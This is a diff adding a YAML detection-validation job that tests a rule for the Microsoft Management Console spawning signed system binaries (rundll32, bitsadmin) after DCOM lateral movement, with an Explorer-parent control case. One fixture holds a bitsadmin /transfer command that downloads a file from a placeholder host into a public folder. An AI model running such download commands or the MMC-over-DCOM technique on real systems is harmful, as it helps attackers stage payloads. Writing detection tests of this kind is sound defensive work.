@@ -1,0 +1,58 @@
+type: job
+name: Mmc LOLBAS Execution Process Spawn
+detection:
+  source: escu
+  name: "ESCU - Mmc LOLBAS Execution Process Spawn - Rule"
+  id: f6601940-4c74-11ec-b9b7-3e22fbd008af
+description: |
+  Validates detection of the Microsoft Management Console spawning a signed
+  system binary, the shape left behind when the console is driven remotely
+  over DCOM and the child inherits its trust. Two binaries from the rule's
+  list are covered. The control runs the same binary from Explorer.
+
+mitre:
+  tactics: [lateral-movement]
+  techniques: [T1021.003, T1218.014]
+
+state:
+  domain_short:       CORP
+  domain_tld:         local
+  domain_short_lower: fn.lower(ref.domain_short)
+  domain_fqdn:        "${ref.domain_short_lower}.${ref.domain_tld}"
+  computer:           gen.hostname(class=windows-server, domain=ref.domain_fqdn)
+
+workloads:
+  - scenario: scenarios/windows/sysmon/process-create/mmc-spawned-lolbas
+    bindings:
+      computer:            ref.computer
+    expectation:
+      expected: alert
+      summary: "mmc.exe spawns rundll32.exe"
+      mitre:
+        tactics: [lateral-movement]
+        techniques: [T1021.003, T1218.014]
+
+
+  - scenario: scenarios/windows/sysmon/process-create/mmc-spawned-lolbas
+    bindings:
+      computer:            ref.computer
+      image:               "C:\\Windows\\System32\\bitsadmin.exe"
+      original_file_name:  bitsadmin.exe
+      command_line:        '"C:\windows\system32\bitsadmin.exe" /transfer j https://cdn.example.com/a C:\Users\Public\a'
+    expectation:
+      expected: alert
+      summary: "mmc.exe spawns bitsadmin.exe"
+      mitre:
+        tactics: [lateral-movement]
+        techniques: [T1021.003, T1218.014]
+
+
+  - scenario: scenarios/windows/sysmon/process-create/mmc-spawned-lolbas
+    bindings:
+      computer:            ref.computer
+      parent_image:        "C:\\Windows\\explorer.exe"
+      parent_command_line: "C:\\Windows\\Explorer.EXE"
+    expectation:
+      expected: none
+      summary: "Explorer spawns the same binary"
+
